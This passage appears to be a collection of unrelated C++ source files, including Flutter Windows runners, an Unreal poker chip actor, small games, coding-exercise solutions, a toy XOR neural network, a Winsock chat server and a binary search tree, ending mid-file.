    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"helpy\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// Copyright (c) 2022-2024 Kaloyan Gerov (Kalcho). No Rights Reserved.\r\n\r\n\r\n#include \"PokerChip.h\"\r\n\r\n#include \"PokerGameModeBase.h\"\r\n#include \"Components/AudioComponent.h\"\r\n#include \"Kismet/GameplayStatics.h\"\r\n\r\n// Sets default values\r\nAPokerChip::APokerChip()\r\n{\r\n\tPrimaryActorTick.bCanEverTick = true;\r\n\tTimeOfMovementEndSound = 0.2f;\r\n\tChipHeight = 0.45f;\r\n\tbPlayMovementEndSound = true;\r\n\t\r\n\tScene = CreateDefaultSubobject<USceneComponent>(TEXT(\"Root\"));\r\n\tScene->SetupAttachment(RootComponent);\r\n\r\n\tMesh = CreateDefaultSubobject<UStaticMeshComponent>(TEXT(\"Mesh\"));\r\n\tMesh->SetupAttachment(Scene);\r\n\r\n\tAudio = CreateDefaultSubobject<UAudioComponent>(TEXT(\"Audio\"));\r\n\tAudio->SetupAttachment(Scene);\r\n\tAudio->bAutoActivate = false;\r\n}\r\n\r\n// Called when the game starts or when spawned\r\nvoid APokerChip::BeginPlay()\r\n{\r\n\tSuper::BeginPlay();\r\n\r\n\tFOnTimelineFloat ProgressFunction;\r\n\tProgressFunction.BindUFunction(this, TEXT(\"TimelineMovementProcess\"));\r\n\tMovementTimeline.AddInterpFloat(MovementCurve, ProgressFunction);\r\n\r\n\tFOnTimelineEvent OnTimelineFinishedFunction;\r\n\tOnTimelineFinishedFunction.BindUFunction(this, TEXT(\"TimelineMovementFinish\"));\r\n\tMovementTimeline.SetTimelineFinishedFunc(OnTimelineFinishedFunction);\r\n\r\n\tFOnTimelineEvent OnTimelineEnd;\r\n\tOnTimelineEnd.BindUFunction(this, TEXT(\"MovementEndSound\"));\r\n\tMovementTimeline.AddEvent(TimeOfMovementEndSound, OnTimelineEnd);\r\n\r\n\tMovementTimeline.SetTimelineLengthMode(TL_LastKeyFrame);\r\n}\r\n\r\nvoid APokerChip::Tick(float DeltaTime)\r\n{\r\n\tSuper::Tick(DeltaTime);\r\n\tif (MovementTimeline.IsPlaying())\r\n\t\tMovementTimeline.TickTimeline(DeltaTime);\r\n}\r\n\r\nvoid APokerChip::Move(const FTransform& NewPosition, bool PlaySound)\r\n{\r\n\tif (!PlaySound)\r\n\t\tbPlayMovementEndSound = false;\r\n\t\r\n\tMovementPosition = NewPosition;\r\n\tMovementTimeline.PlayFromStart();\r\n}\r\n\r\n// === Timeline Methods ===\r\nvoid APokerChip::TimelineMovementProcess(float DeltaTime)\r\n{\r\n\tFVector Location = FMath::Lerp(GetActorLocation(), MovementPosition.GetLocation(), DeltaTime);\r\n\tFRotator Rotation = FMath::Lerp<FRotator>(GetActorRotation(), MovementPosition.Rotator(), DeltaTime);\r\n\tSetActorLocationAndRotation(Location, Rotation);\r\n}\r\n\r\nvoid APokerChip::TimelineMovementFinish()\r\n{\r\n}\r\n\r\nvoid APokerChip::MovementEndSound()\r\n{\r\n\tif (bPlayMovementEndSound)\r\n\t{\r\n\t\tbPlayMovementEndSound = true;\r\n\t\tOnEndMovement();\r\n\t}\r\n}\r\n\r\nvoid APokerChip::Init(const EChipColor ChipColor)\r\n{\r\n\tFPokerChipsValue ChipsValue = Cast<APokerGameModeBase>(UGameplayStatics::GetGameMode(GetWorld()))->GetChipsValue();\r\n\t\r\n\tswitch (ChipColor)\r\n\t{\r\n\t\tcase EChipColor::CC_Red:\r\n\t\t\tValue = ChipsValue.RedChipValue;\r\n\t\t\tbreak;\r\n\t\tcase EChipColor::CC_Blue:\r\n\t\t\tValue = ChipsValue.BlueChipValue;\r\n\t\t\tbreak;\r\n\t\tcase EChipColor::CC_Green:\r\n\t\t\tValue = ChipsValue.GreenChipValue;\r\n\t\t\tbreak;\r\n\t\tcase EChipColor::CC_Black:\r\n\t\t\tValue = ChipsValue.BlackChipValue;\r\n\t\t\tbreak;\r\n\t}\r\n\tColor = ChipColor;\r\n\r\n\tFString ColorText = UEnum::GetValueAsString(ChipColor);\r\n\tColorText.RemoveAt(0, 15);\r\n\tFString Path = \"StaticMesh'/Game/Poker/PokerAssets/PokerChips/Meshes/SM_PokerChip_\" + ColorText + \".SM_PokerChip_\" + ColorText + \"'\";\r\n\tSoftObjectPath.SetPath(Path);\r\n\tif (SoftObjectPath.IsValid())\r\n\t\tMesh->SetStaticMesh(static_cast<UStaticMesh*>(SoftObjectPath.TryLoad()));\r\n}\r\n\r\nfloat APokerChip::GetValue() const\r\n{\r\n\treturn Value;\r\n}\r\n\r\nEChipColor APokerChip::GetColor() const\r\n{\r\n\treturn Color;\r\n}\r\n\r\nUCurveFloat* APokerChip::GetMovementCurve() const\r\n{\r\n\treturn MovementCurve;\r\n}\r\n\r\nfloat APokerChip::GetChipHeight() const\r\n{\r\n\treturn ChipHeight;\r\n}\r\n\r\n",
    "#include \"aspch.h\"\n#include \"Application.h\"\n\n#include \"AdiSim/Log.h\"\n\n#include <Glad/glad.h>\n\nnamespace AdiSim {\n\n#define BIND_EVENT_FN(x) std::bind(&Application::x, this, std::placeholders::_1)\n\n\tApplication::Application() \n\t{\n\t\tm_Window = std::unique_ptr<Window>(Window::Create());\n\t\tm_Window->SetEventCallback(BIND_EVENT_FN(OnEvent));\n\n\t\tunsigned int id;\n\t\tglGenVertexArrays(1, &id);\n\n\t}\n\n\tApplication::~Application()\n\t{\n\t}\n\n\tvoid Application::PushLayer(Layer* layer)\n\t{\n\t\tm_LayerStack.PushLayer(layer);\n\t}\n\n\tvoid Application::PushOverlay(Layer* layer)\n\t{\n\t\tm_LayerStack.PushOverlay(layer);\n\t}\n\n\tvoid Application::OnEvent(Event& e)\n\t{\n\t\tEventDispatcher dispatcher(e);\n\t\tdispatcher.Dispatch<WindowCloseEvent>(BIND_EVENT_FN(OnWindowClose));\n\n\t\tfor (auto it = m_LayerStack.end(); it != m_LayerStack.begin(); )\n\t\t{\n\t\t\t(*--it)->OnEvent(e);\n\t\t\tif (e.Handled)\n\t\t\t\tbreak;\n\t\t}\n\t}\n\n\tvoid Application::Run()\n\t{\n\t\twhile (m_Running)\n\t\t{\n\t\t\tglClearColor(1, 0, 1, 1);\n\t\t\tglClear(GL_COLOR_BUFFER_BIT);\n\n\t\t\tfor (Layer* layer : m_LayerStack)\n\t\t\t\tlayer->OnUpdate();\n\n\t\t\tm_Window->OnUpdate();\n\t\t}\n\t}\n\n\tbool Application::OnWindowClose(WindowCloseEvent& e)\n\t{\n\t\tm_Running = false;\n\t\treturn true;\n\t}\n\n}",
    "#include <iostream>\nusing namespace std;\n\n// Function prototypes\nvoid displayBoard(char board[]);\nbool checkWin(char board[], char player);\nbool checkDraw(char board[]);\nvoid makeMove(char board[], char player);\n\nint main() {\n    char board[9] = {'1', '2', '3', '4', '5', '6', '7', '8', '9'};\n    char player = 'X';\n    bool gameOn = true;\n\n    while (gameOn) {\n        displayBoard(board);\n        makeMove(board, player);\n        \n        if (checkWin(board, player)) {\n            displayBoard(board);\n            cout << \"Player \" << player << \" wins!\\n\";\n            gameOn = false;\n        } else if (checkDraw(board)) {\n            displayBoard(board);\n            cout << \"It's a draw!\\n\";\n            gameOn = false;\n        } else {\n            player = (player == 'X') ? 'O' : 'X';\n        }\n    }\n    return 0;\n}\n\nvoid displayBoard(char board[]) {\n    cout << \"\\n\";\n    cout << \" \" << board[0] << \" | \" << board[1] << \" | \" << board[2] << \"\\n\";\n    cout << \"---|---|---\\n\";\n    cout << \" \" << board[3] << \" | \" << board[4] << \" | \" << board[5] << \"\\n\";\n    cout << \"---|---|---\\n\";\n    cout << \" \" << board[6] << \" | \" << board[7] << \" | \" << board[8] << \"\\n\";\n    cout << \"\\n\";\n}\n\nbool checkWin(char board[], char player) {\n    // Check rows, columns, and diagonals\n    return (\n        (board[0] == player && board[1] == player && board[2] == player) ||\n        (board[3] == player && board[4] == player && board[5] == player) ||\n        (board[6] == player && board[7] == player && board[8] == player) ||\n        (board[0] == player && board[3] == player && board[6] == player) ||\n        (board[1] == player && board[4] == player && board[7] == player) ||\n        (board[2] == player && board[5] == player && board[8] == player) ||\n        (board[0] == player && board[4] == player && board[8] == player) ||\n        (board[2] == player && board[4] == player && board[6] == player)\n    );\n}\n\nbool checkDraw(char board[]) {\n    for (int i = 0; i < 9; i++) {\n        if (board[i] != 'X' && board[i] != 'O') {\n            return false;\n        }\n    }\n    return true;\n}\n\nvoid makeMove(char board[], char player) {\n    int move;\n    bool validMove = false;\n\n    while (!validMove) {\n        cout << \"Player \" << player << \", enter your move (1-9): \";\n        cin >> move;\n        if (move >= 1 && move <= 9 && board[move - 1] != 'X' && board[move - 1] != 'O') {\n            board[move - 1] = player;\n            validMove = true;\n        } else {\n            cout << \"Invalid move. Try again.\\n\";\n        }\n    }\n}\n",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   main.cpp                                           :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: kahmada <kahmada@student.42.fr>            +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2024/12/18 20:16:37 by kahmada           #+#    #+#             */\n/*   Updated: 2025/01/01 18:09:29 by kahmada          ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n\n#include \"Fixed.hpp\"\n\nint main( void ) {\nFixed a;\nFixed const b( Fixed( 5.05f ) * Fixed( 2 ) );\nstd::cout << a << std::endl;\nstd::cout << ++a << std::endl;\nstd::cout << a << std::endl;\nstd::cout << a++ << std::endl;\nstd::cout << a << std::endl;\nstd::cout << b << std::endl;\nstd::cout << Fixed::max( a, b ) << std::endl;\nreturn 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"todo_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"app_tasks\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"../headers/2-Room.hpp\"\n#include <iostream>\n#include <algorithm>\n\nusing namespace std;\n\n// Room Constructor\nRoom::Room(const string& type, double price, int roomNum, bool status)\n    : type(type), price(price), roomNum(roomNum), status(status) {}\n\n// Virtual Destructor\nRoom::~Room() {}\n\n// Update Room Status (Booking or Checkout)\nbool Room::updateStatus() {\n    cout << \"Room booking or checkout (Enter 'booking' or 'checkout'): \";\n    string action;\n    cin >> action;\n\n    // Convert input to lowercase\n    transform(action.begin(), action.end(), action.begin(), ::tolower);\n\n    if (action == \"booking\" && status) {\n        status = false; // Room is now occupied\n        cout << \"Room #\" << roomNum << \" has been successfully booked.\\n\";\n        return true;\n    } else if (action == \"checkout\" && !status) {\n        status = true; // Room is now empty\n        cout << \"Room #\" << roomNum << \" has been successfully checked out.\\n\";\n        return true;\n    } else {\n        cout << \"Invalid action or room is already in the desired state.\\n\";\n        return false;\n    }\n}\n\n// Get Room Price\ndouble Room::getPrice() const {\n    return price;\n}\n\n// Display Room Information\nvoid Room::displayInfo() const {\n    cout << \"Room Details:\\n\";\n    cout << \"  Type       : \" << type << endl;\n    cout << \"  Number     : \" << roomNum << endl;\n    cout << \"  Price      : $\" << fixed << setprecision(2) << price << endl;\n}\n\n// Get Room Number\nint Room::getRoomNumber() const {\n    return roomNum;\n}\n\n// Check Availability\nbool Room::isAvailable() const {\n    return status;\n}\n\n// SingleRoom Constructor\nSingleRoom::SingleRoom(double price, int roomNum, bool status)\n    : Room(\"Single\", price, roomNum, status) {}\n\n// Overridden Display Info\nvoid SingleRoom::displayInfo() const {\n    cout << \"Single Room Details:\\n\";\n    Room::displayInfo();\n}\n\n// DoubleRoom Constructor\nDoubleRoom::DoubleRoom(double price, int roomNum, bool status)\n    : Room(\"Double\", price, roomNum, status) {}\n\n// Overridden Display Info\nvoid DoubleRoom::displayInfo() const {\n    cout << \"Double Room Details:\\n\";\n    Room::displayInfo();\n}\n\n// Suite Constructor\nSuite::Suite(double price, int roomNum, bool status)\n    : Room(\"Suite\", price, roomNum, status) {}\n\n// Overridden Display Info\nvoid Suite::displayInfo() const {\n    cout << \"Suite Details:\\n\";\n    Room::displayInfo();\n}\n",
    "    // Leetcode Link               : https://leetcode.com/problems/check-if-array-is-sorted-and-rotated/description/\n\n\n\n/**************************************************************** C++ ****************************************************************/\n\n\n// Approach - 1  (Brute Force )\n\n//T.C : O(N^2)  \n//S.C : O(N) space used \n\nclass Solution {\npublic:\n    bool check(vector<int>& nums) {\n        int n = nums.size();\n\n        vector<int>sortedArray = nums;\n        sort(sortedArray.begin(), sortedArray.end());\n        for(int i = 0;i<n;i++){\n            int firstEle = sortedArray[0];\n            for(int j = 1;j<n;j++){\n                sortedArray[j-1] = sortedArray[j];\n            }\n            sortedArray[n-1] = firstEle;\n            if(sortedArray == nums) return true;\n        }\n        return false;\n    }\n};\n\n\n/********************************************************************************************************************************/\n\n\n// Approach - 2  (Optimal) > By observation and finding smallerCounts.\n\n//T.C : O(N)  \n//S.C : O(1)\n\nclass Solution {\npublic:\n    bool check(vector<int>& nums) {\n        int smallerCount = 0;\n        int n = nums.size();\n\n        for(int i = 1;i<n;i++){\n            if(nums[i]<nums[i-1]) smallerCount++;\n        }\n\n        if(nums[0]<nums[n-1]) smallerCount++;\n        return smallerCount<=1;\n    }\n};\n",
    "//{ Driver Code Starts\r\n// Initial Template for C++\r\n#include <bits/stdc++.h>\r\n#include <unordered_map>\r\nusing namespace std;\r\n\r\n\r\n// } Driver Code Ends\r\n// User function Template for C++\r\n\r\nclass Solution {\r\n  public:\r\n    vector<vector<string>> anagrams(vector<string>& arr) {\r\n        // code here\r\n        vector<vector<string>> v2;\r\n        vector<string> v1;\r\n        map<string,vector<string>> mp;\r\n        string st;\r\n        for(int i=0; i<arr.size(); i++){\r\n            st = arr[i];\r\n            sort(st.begin(),st.end());\r\n            mp[st].push_back(arr[i]);\r\n        }\r\n        for(auto i:mp){\r\n            for(auto j: i.second){\r\n                v1.push_back(j);\r\n            }\r\n            v2.push_back(v1);\r\n            v1.clear();\r\n        }\r\n        return v2;\r\n    }\r\n};\r\n\r\n//{ Driver Code Starts.\r\n\r\nint main() {\r\n    int t;\r\n    cin >> t;\r\n    cin.ignore();\r\n    while (t--) {\r\n\r\n        vector<string> arr;\r\n        string input_line;\r\n        getline(cin, input_line);\r\n        stringstream ss(input_line);\r\n        string word;\r\n        while (ss >> word) {\r\n            arr.push_back(word);\r\n        }\r\n\r\n        Solution ob;\r\n        vector<vector<string> > result = ob.anagrams(arr);\r\n        sort(result.begin(), result.end());\r\n        for (int i = 0; i < result.size(); i++) {\r\n            for (int j = 0; j < result[i].size(); j++) {\r\n                cout << result[i][j] << \" \";\r\n            }\r\n            cout << \"\\n\";\r\n        }\r\n\r\n        cout << \"~\"\r\n             << \"\\n\";\r\n    }\r\n\r\n    return 0;\r\n}\r\n\r\n// } Driver Code Ends\r\n",
    "#include \"network.h\"\n\n//\n// FURTHER NOTICE\n//\n// Typically, more complex neural networks with larger datasets implement the following concepts:\n//\n// Because this network is really simple and the dataset is small, I didn't implement these concepts, BUT these are essential\n// and in an actual project, you should implement them.\n//\n// 1. Batch Processing:\n//    - Instead of updating weights after every individual data point, the training data is divided into smaller subsets, called \"batches\".\n//    - Gradients are computed for each batch, and weights are updated after processing the entire batch.\n//    - This approach is more computationally efficient, smooths the updates, and helps the model generalize better.\n//    - For instance, with 1,000 training samples and a batch size of 100:\n//      - The model processes 100 samples at a time, computes the gradients, and updates weights.\n//      - This results in only 10 updates per epoch, as opposed to 1,000 updates.\n//\n// 2. Shuffling Data:\n//    - To prevent the model from learning unintended patterns based on the data order, the training data is usually shuffled at the beginning of each epoch.\n//    - This helps improve generalization and prevent overfitting to the specific sequence of samples.\n//\n// 3. Validation Set:\n//    - A separate subset of data, known as the validation set, is typically used to evaluate the model\u2019s performance during training.\n//    - This allows us to monitor overfitting and ensure the model generalizes well to unseen data.\n//    - The validation loss is computed after each epoch but is not used in weight updates.\n//\n// 4. Optimizers:\n//    - Optimizers update the model\u2019s weights to minimize the loss function.\n//    - Common optimizers include SGD (Stochastic Gradient Descent), Adam, RMSprop, and Adagrad.\n//    - In this code, a simple SGD optimizer is used. Although more advanced optimizers can improve performance in larger, more complex networks, \n//\tthey are not strictly necessary for a small network like this.\n//\n// Network Setup:\n// - The data used here represents the classic XOR problem, where the model learns to output 1 for (0,1) and (1,0) inputs, and 0 for (0,0) and (1,1) inputs.\n//\n// Also you would usually implement neural networks in cuda since it is much much faster than cpu, but I didn't do that here.\n//\n\nint main()\n{\n\tstd::vector<NetInput> data;\n\n\t// initialize XOR data: input -> target\n\tdata = {\n\t\tNetInput({0, 1}, {1}),\n\t\tNetInput({1, 0}, {1}),\n\t\tNetInput({0, 0}, {0}),\n\t\tNetInput({1, 1}, {0})\n\t};\n\t\n\tNetwork net;\n\tnet.train(data, 100'000);  // train the network for 100,000 epochs\n\n\t// test the trained network\n\tstd::cout << \"\\nTesting network:\\n\" << std::endl;\n\tfor (size_t i = 0; i < data.size(); i++)\n\t{\n\t\tArray prediction = net.forward(data[i].input);\n\t\tArray target = data[i].target;\n\n\t\tfor (int j = 0; j < prediction.getSize(); j++)\n\t\t\tstd::cout << \"Data \" << (i + 1) \n\t\t\t\t\t  << \": Prediction = \" << prediction[j] \n\t\t\t\t\t  << \" Target = \" << target[j] << std::endl;\n\t}\n\n\treturn 0;\n}\n",
    "#include <iostream>\r\n#include <winsock2.h>\r\n#include <ws2tcpip.h>\r\n#include <tchar.h>\r\n#include <thread>\r\n#include <vector>\r\n\r\nusing namespace std;\r\n\r\n#pragma comment(lib,\"ws2_32.lib\") \r\n\r\n// Roadmap\r\n// Step1: initialize winsock library\r\n// Step2: create the socket \r\n// Step3: get ip and port on which it runs (local host!) \r\n// Step4: bind the ip or port with the socket \r\n// Step5: we will start listening on the socket \r\n// Step6: accept the blocking call \r\n// Step7: recieve and send \r\n// Step8: close the socket \r\n// Step9: we will cleanup the winsock libraray\r\n\r\nbool initialize() {\r\n    WSADATA data;\r\n    return WSAStartup(MAKEWORD(2, 2), &data) == 0;\r\n}\r\n\r\nvoid InteractWithClient(SOCKET clientSocket, vector<SOCKET>& clients) {\r\n    // send and receive messages from client\r\n    cout << \"Client connected!\" << endl;\r\n    char buffer[4096];\r\n    while (1) {\r\n        int bytesrecvd = recv(clientSocket, buffer, sizeof(buffer), 0);\r\n        if (bytesrecvd <= 0) {\r\n            cout << \"Client disconnected!\" << endl;\r\n            break;\r\n        }\r\n\r\n        string message(buffer, bytesrecvd);\r\n        cout << \"message from client : \" << message << endl;\r\n        for (auto client : clients) {\r\n            if (client != clientSocket) {\r\n                send(client, message.c_str(), message.length(), 0);\r\n\r\n            }\r\n        }\r\n    }\r\n\r\n    auto it = find(clients.begin(), clients.end(), clientSocket);\r\n    if (it != clients.end()) {\r\n        clients.erase(it);\r\n    }\r\n    closesocket(clientSocket);\r\n}\r\n\r\nint main() {\r\n    if (!initialize()) {\r\n        cout << \"Winsock initialization failed!\" << endl;\r\n        return 1;\r\n    }\r\n    cout << \"Server program!\" << endl;\r\n\r\n    // implementing step2, step3, and step4: creating a socket , getting ip and port on which it runs (local host!) and binding the ip or port with the socket \r\n    SOCKET listenSocket = socket(AF_INET, SOCK_STREAM, 0);\r\n    if (listenSocket == INVALID_SOCKET) {\r\n        cout << \"Socket is not created!\" << endl;\r\n        return 1;\r\n    }\r\n    // creating address structure \r\n    int port = 12345;\r\n    sockaddr_in serveraddr;\r\n    serveraddr.sin_family = AF_INET;\r\n    serveraddr.sin_port = htons(port);\r\n\r\n    // converting the ipaddress (0.0.0.0) put it inside the sin_family in binary form\r\n    if (InetPton(AF_INET, _T(\"0.0.0.0\"), &serveraddr.sin_addr) != 1) {\r\n        cout << \"Setting address structure failed!\" << endl;\r\n        closesocket(listenSocket);\r\n        WSACleanup();\r\n        return 1;\r\n    }\r\n    // bind code\r\n    if (bind(listenSocket, reinterpret_cast<sockaddr*>(&serveraddr), sizeof(serveraddr)) == SOCKET_ERROR) {\r\n        cout << \"Bind code failed!\" << endl;\r\n        closesocket(listenSocket);\r\n        WSACleanup();\r\n        return 1;\r\n    }\r\n    // step5: listening to the socket\r\n    if (listen(listenSocket, SOMAXCONN) == SOCKET_ERROR) {\r\n        cout << \"Listening to the socket failed!\" << endl;\r\n        closesocket(listenSocket);\r\n        WSACleanup();\r\n        return 1;\r\n\r\n    }\r\n    cout << \"Server has started listening on the port: \" << port << endl;\r\n    vector<SOCKET> clients;\r\n    while (1) {\r\n        //  step6: accepting the listening from the client\r\n        SOCKET clientSocket = accept(listenSocket, nullptr, nullptr);\r\n        if (clientSocket == INVALID_SOCKET) {\r\n            cout << \"ClientSocket is invalid!\";\r\n        }\r\n        clients.push_back(clientSocket);\r\n        thread tl(InteractWithClient, clientSocket, std::ref(clients));\r\n        tl.detach();\r\n    }\r\n\r\n\r\n    closesocket(listenSocket);\r\n\r\n    WSACleanup();\r\n    return 0;\r\n}",
    "#include \"./bst.hpp\"\n\nnamespace engineswap{\n\tbst::bst(){\n\t\thead = nullptr;\n\t}\n\n\tvoid bst::insert(BSTNode* root, int key){\n\t\tif (head==nullptr){\n\t\t\thead = new BSTNode(key);\n\t\t}else{\n\t\t\tif (root->val < key){\n\t\t\t\tif(root->right==nullptr){\n\t\t\t\t\t// insert right and were done\n\t\t\t\t\troot->right = new BSTNode(key);\n\t\t\t\t}else{\n\t\t\t\t\t//go right recursively\n\t\t\t\t\tinsert(root->right, key);\n\t\t\t\t}\n\t\t\t}else if(root->val > key){\n\t\t\t\tif(root->left==nullptr){\n\t\t\t\t\t// insert left and were done\n\t\t\t\t\troot->left = new BSTNode(key);\n\t\t\t\t}else{\n\t\t\t\t\t//go left recursively\n\t\t\t\t\tinsert(root->left, key);\n\t\t\t\t}\n\t\t\t}else{\n\t\t\t\tthrow std::runtime_error(\"Cannot insert a duplicate value.\");\n\t\t\t}\n\t\t}\n\t}\n\n\tbool bst::search(BSTNode* root, int key){\n\t\tif (root==nullptr){\n\t\t\treturn false;\n\t\t}else if(root->val < key){\n\t\t\treturn search(root->right, key);\n\t\t}else if(root->val > key){\n\t\t\treturn search(root->left, key);\n\t\t}else{\n\t\t\treturn true;\n\t\t}\n\t}\n\n\tBSTNode* bst::findMin(BSTNode* root){\n\t\tif (root==nullptr){\n\t\t\tthrow std::runtime_error(\"Empty tree has no minimum.\");\n\t\t}\n\t\tif (!root->left){\n\t\t\treturn root;\n\t\t}else{\n\t\t\treturn findMin(root->left);\n\t\t}\n\t}\n\n\t// edgecase when parent==nullptr and root->val == key\n\tvoid bst::remove(BSTNode* root, BSTNode* parent, int key){\n\t\tif(root == nullptr){\n\t\t\tthrow std::runtime_error(\"Key doesn't exist in tree.\");\n\t\t}\n\t\t\n\t\tif (root->val > key){\n\t\t\tremove(root->left, root, key);\n\t\t}else if(root->val < key){\n\t\t\tremove(root->right, root, key);\n\t\t}else{\n\t\t\tcout << \"Found elem to remove\\n\";\n\t\t\t// Remove root\n\t\t\tint children = 0;\n\t\t\tif (root->left) children ++;\n\t\t\tif (root->right) children ++;\n\t\t\tcout << \"Node to remove has \" << children << \" children\\n\";\n\n\t\t\tif (children==0){\n\t\t\t\tif(parent==nullptr){\n\t\t\t\t\tdelete head;\n\t\t\t\t\thead = nullptr;\n\t\t\t\t}else{\n\t\t\t\t\t// delete this node\n\t\t\t\t\tdelete root;\n\t\t\t\t\t// Sever parents tie to this node.\n\t\t\t\t\tif (parent->left && parent->left == root){\n\t\t\t\t\t\tparent->left = nullptr;\n\t\t\t\t\t}else{\n\t\t\t\t\t\tparent->right = nullptr;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}else if(children==1){\n\t\t\t\tBSTNode* child = (root->left) ? root->left : root->right;\n\t\t\t\tif(parent==nullptr){\n\t\t\t\t\tdelete head;\n\t\t\t\t\thead = child;\n\t\t\t\t}else{\n\t\t\t\t\t// Make parent point to the existing child\n\t\t\t\t\t// Delete root\n\t\t\t\t\tBSTNode* child = (root->left) ? root->left : root->right;\n\t\t\t\t\tif (parent->left && parent->left == root){\n\t\t\t\t\t\tparent->left = child;\n\t\t\t\t\t}else{\n\t\t\t\t\t\tparent->right = child;\n\t\t\t\t\t}\n\t\t\t\t\tdelete root;\n\t\t\t\t}\n\n\t\t\t}else{\n\t\t\t\t\t// 2 children\n\t\t\t\t\t// Find min elem in right subtree (minRight)\n\t\t\t\t\tBSTNode* minRight = findMin(root->right);\n\t\t\t\t\t\n\t\t\t\t\t// Set root.val = minRight.val\n\t\t\t\t\troot->val = minRight->val;\n\n\t\t\t\t\t// delete minRight from right subtree\n\t\t\t\t\tremove(root->right, root, minRight->val);\n\t\t\t}\n\t\t}\n\t}\n\n\tint bst::height(BSTNode* root, int curHeight){\n\t\tif (root==nullptr){\n\t\t\treturn curHeight-1;\n\t\t}\n\t\tint leftHeight = height(root->left, curHeight+1);\n\t\tint rightHeight = height(root->right, curHeight+1);\n\n\t\treturn std::max(leftHeight, rightHeight);\n\t}\n\n\tvoid bst::preorder(BSTNode* root, std::vector<int>& traversal){\n\t\tif (root==nullptr) return;\n\n\t\ttraversal.push_back(root->val);\n\t\tpreorder(root->left, traversal);\n\t\tpreorder(root->right, traversal);\n\t}\n\n\tbool bst::isEmpty(){\n\t\treturn head==nullptr;\n\t}\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  